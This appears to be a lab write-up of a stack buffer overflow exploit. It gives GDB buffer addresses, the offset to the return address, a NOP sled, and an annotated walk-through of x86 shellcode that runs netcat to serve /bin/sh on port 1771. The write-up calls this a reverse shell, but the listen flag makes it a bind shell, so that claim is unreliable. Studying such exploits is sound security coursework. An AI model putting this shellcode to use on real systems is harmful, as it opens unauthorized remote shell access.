# Buffer starting address

In GDB: 0xffffd05b 
Outside GDB: 0xffffd01b

# Buffer offset

Buffer is located at: `ebp - 0x6d`
Return address is at: `ebp + 0x4`

So,

Buffer offset from frame pointer = 0x6d = 109 bytes

Buffer offset to return address = 113 bytes

# # Return address

Return Address = 0xffffd090

Found via exp-revshell.py

# First assembly instruction at return address

this will be the nop instruction due to the nop sled that appears at the start of the injected code.

# Shell code explanation

xor %eax, %eax:
Clears EAX, setting it to 0.

xor %edx, %edx:
Clears EDX (sets to 0), used for NULLs later.

push %eax:
Push NULL terminator for the final command string.

push $0x31373737:
Pushes the ASCII string `"1771"` (the port number) in reverse byte order.

push $0x3170762d
Pushes the ASCII string `"-vp1"` in reverse byte order.

Together, the last two pushes form the string: `-vp 1771`
   (used as arguments to `nc` for reverse shell)

mov %esp, %esi
Stores a pointer to the "-vp 1771" string into ESI.

push %eax
Push NULL terminator for next string ("/bin//sh").

push $0x68732f2f
Pushes ASCII string `"//sh"`.

push $0x6e69622f
Pushes ASCII string `"/bin"`.

push $0x2f656c2d
Pushes ASCII string `"-le/"` (for `-le /bin//sh`)

Combined, these pushes create: `-le /bin//sh`

mov %esp, %edi
Stores a pointer to the `-le /bin//sh` string into EDI.

push %eax
Push NULL terminator for the next string.

push $0x636e2f2f
Pushes ASCII string `"//nc"`.

push $0x6e69622f
Pushes ASCII string `"/bin"`.

Combined, these make `/bin//nc`

mov %esp, %ebx
Sets EBX to point to the command `/bin//nc` (netcat binary).

push %edx
Push NULL (argv[4] = NULL)

push %esi
Push pointer to `-vp 1771` string (argv[3])

push %edi
Push pointer to `-le /bin//sh` string (argv[2])

push %ebx
Push pointer to `/bin//nc` (argv[1])

mov %esp, %ecx
ECX = argv array (`argv = ["/bin//nc", "-le/bin//sh", "-vp 1771", NULL]`)

mov $0x0b, %al
Syscall number 11 (for `execve`)

int $0x80
Executes `execve("/bin//nc", argv, NULL)`  
This launches Netcat in reverse shell mode, connecting back to the attacker with `-le /bin//sh -vp 1771`
